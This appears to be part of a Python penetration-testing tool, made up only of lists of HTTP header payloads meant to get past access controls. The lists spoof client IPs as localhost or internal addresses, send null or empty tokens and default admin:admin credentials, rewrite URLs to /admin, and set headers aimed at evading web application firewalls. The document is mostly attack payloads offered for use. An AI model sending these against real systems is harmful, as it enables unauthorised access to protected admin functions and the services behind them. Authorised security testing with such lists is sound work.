# ============================================================
# HEADER BYPASS PAYLOADS
# ============================================================

IP_SPOOF_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Via": "1.1 127.0.0.1"},
    {"X-Azure-ClientIP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},
    {"X-Forwarded-For": "::1"},
]

AUTH_BYPASS_HEADERS = [
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Bearer "},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"Authorization": "Basic YWRtaW46"},           # admin:
    {"X-Auth-Token": "null"},
    {"X-API-Key": "null"},
    {"X-Access-Token": ""},
    {"X-Custom-Auth": "bypass"},
    {"X-Internal-Request": "true"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/"},
    {"X-Backend-Server": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Proto": "https"},
]

CONTENT_TYPE_HEADERS = [
    {"Content-Type": "application/json"},
    {"Content-Type": "application/x-www-form-urlencoded"},
    {"Content-Type": "text/xml"},
    {"Content-Type": "application/xml"},
    {"Content-Type": "multipart/form-data"},
    {"Content-Type": "text/plain"},
    {"Content-Type": "application/json; charset=utf-8"},
    {"Content-Type": "application/json; charset=UTF-8"},
]

MISC_BYPASS_HEADERS = [
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-WAF-Bypass": "true"},
    {"X-Ignore-WAF": "1"},
    {"Pragma": "no-cache"},
    {"Cache-Control": "no-cache"},
    {"Accept": "*/*"},
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Connection": "keep-alive"},
    {"Upgrade-Insecure-Requests": "1"},
    {"DNT": "1"},
]
